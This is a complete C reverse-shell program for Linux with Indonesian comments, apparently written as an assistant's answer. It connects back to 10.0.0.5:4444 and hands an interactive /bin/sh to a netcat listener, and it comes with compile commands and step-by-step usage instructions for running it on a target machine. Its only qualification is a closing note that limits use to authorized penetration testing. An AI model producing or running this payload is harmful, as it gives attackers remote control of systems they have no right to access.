/*
 * reverse_shell.c — Reverse shell Linux (x86_64 / i386), connect ke 10.0.0.5:4444 lalu spawn /bin/sh
 * Compile: gcc -O2 -Wall -o reverse_shell reverse_shell.c
 * Listener : nc -lvnp 4444   (di 10.0.0.5)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LHOST "10.0.0.5"
#define LPORT 4444

int main(void)
{
    int fd;
    struct sockaddr_in sa;

    /* 1. Buat socket TCP */
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    /* 2. Isi alamat listener */
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(LPORT);
    if (inet_pton(AF_INET, LHOST, &sa.sin_addr) != 1) {
        fprintf(stderr, "inet_pton: alamat tidak valid (%s)\n", LHOST);
        close(fd);
        return 1;
    }

    /* 3. Connect balik ke 10.0.0.5:4444 */
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(fd);
        return 1;
    }

    /* 4. Redirect stdin/stdout/stderr ke socket */
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    if (fd > 2) close(fd);

    /* 5. Ganti proses menjadi /bin/sh */
    execl("/bin/sh", "sh", (char *)NULL);

    /* execl hanya kembali kalau gagal */
    perror("execl /bin/sh");
    return 1;
}
```

**Cara compile:**

```bash
gcc -O2 -Wall -o reverse_shell reverse_shell.c
```

**Cara pakai:**

1. Di mesin `10.0.0.5`, jalankan listener:
   ```bash
   nc -lvnp 4444
   ```
2. Di mesin target, jalankan:
   ```bash
   ./reverse_shell
   ```

**Mekanisme:**
- `socket()` membuat socket TCP/IPv4.
- `connect()` melakukan koneksi balik ke `10.0.0.5:4444` (port dikonversi ke network byte order via `htons`).
- `dup2()` menyalin file descriptor socket ke fd 0, 1, 2 sehingga stdin/stdout/stderr shell mengalir lewat koneksi jaringan.
- `execl("/bin/sh", ...)` mengganti proses ini menjadi shell interaktif — semua input/output kini melewati socket, memberi shell penuh di sisi listener.

**Catatan:** Ini adalah payload standar untuk pengujian penetrasi (mirip `msfvenom`/Metasploit). Gunakan hanya di sistem yang Anda miliki izin eksplisit untuk diuji.
